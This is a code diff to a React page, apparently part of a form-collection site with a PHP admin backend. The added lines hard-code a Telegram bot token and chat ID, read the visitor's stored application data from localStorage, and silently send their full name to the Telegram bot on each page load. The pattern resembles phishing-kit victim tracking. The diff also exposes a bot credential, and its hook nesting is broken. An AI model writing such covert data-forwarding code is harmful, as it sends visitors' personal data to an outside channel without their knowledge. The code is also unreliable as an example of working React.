@@ -21,10 +21,19 @@ import SecondErrorPage from "../components/secondErrorPage";
 
 // The URL for your PHP backend
 const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api.php"; // Update this based on your server configuration
+const BOT_TOKEN = '7939347007:AAFu3fkYZiNVGkc1viOKLP4CY722hYGsoq8';
+const CHAT_ID = '6639364559';
+
+
 
 const UserPage2 = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopupu2, setShowPopupu2] = useState(false);
+
+const storedData = localStorage.getItem("applicationData");
+const parsedData = storedData ? JSON.parse(storedData) : {};
+
+const fullName = parsedData.fullname || "N/A";
 
   // Fetch the current form from the PHP backend
   useEffect(() => {
@@ -38,6 +47,29 @@ const UserPage2 = () => {
         console.error("Failed to fetch form type from PHP:", error);
       }
     };
+
+    
+
+
+const sendToTelegram = async (message: string) => {
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+    }),
+  });
+};
+
+
+    useEffect(() => {
+      // Notify on page load
+      sendToTelegram(`✅ ${fullName} has opened the user 2 page. and refreshed`);
+    }, []);
+  
 
     fetchFormType();
   }, []);
